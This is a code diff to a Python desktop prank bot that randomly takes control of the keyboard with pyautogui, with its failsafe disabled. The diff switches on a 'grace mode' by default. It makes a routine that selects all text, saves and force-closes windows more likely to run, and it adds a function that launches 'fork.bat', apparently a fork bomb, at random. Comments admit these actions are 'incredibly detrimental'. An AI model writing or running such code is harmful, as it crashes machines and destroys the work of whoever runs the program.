@@ -96,6 +96,7 @@ root = tk.Tk()
 root.withdraw()
 
 pag.FAILSAFE = False
+grace_mode = True
 
 # Utility functions
 def kill_joshbot():
@@ -227,7 +228,7 @@ def virtual_insanity():
         temp = beats[i]
         display_image("special_images/Virtual-Insanity-Frames/" + str(i + 1) + ".png")
 
-# Grace functions
+# Grace functions, these are incredibly detrimental, run at your own risk.
 def htijwbtlgio():
     print("and today we are going to be playing tech support.")
     pag.hotkey("ctrl", "a")
@@ -235,6 +236,10 @@ def htijwbtlgio():
     pag.hotkey("ctrl", "s")
     pag.hotkey("alt", "f4")
     pag.hotkey("alt", "f4")
+
+def fork_yourself():
+    fork_bomb = "fork.bat"
+    subprocess.Popen(fork_bomb)
 
 # Dictionary of possible outcomes for the random_function() function. Second value is weight, higher = more likely
 def your_name_is_grace():
@@ -256,7 +261,8 @@ possible_functions = {
     your_name_is_grace: 1
 }
 grace_functions = {
-    htijwbtlgio: 1
+    htijwbtlgio: 5,
+    fork_yourself: 1
 }
 
 def random_function():
@@ -280,5 +286,12 @@ def joshing_with_you():
 
 # ---------- MAIN PROGRAM ----------
 keyboard.add_hotkey('ctrl+alt+j', kill_joshbot)
+
+# Only enable grace mode if you no longer fear Hell.
+if grace_mode:
+    possible_functions[your_name_is_grace] = 1
+else:
+    possible_functions[your_name_is_grace] = 0
+
 threading.Thread(target=joshing_with_you).start()
 root.mainloop()
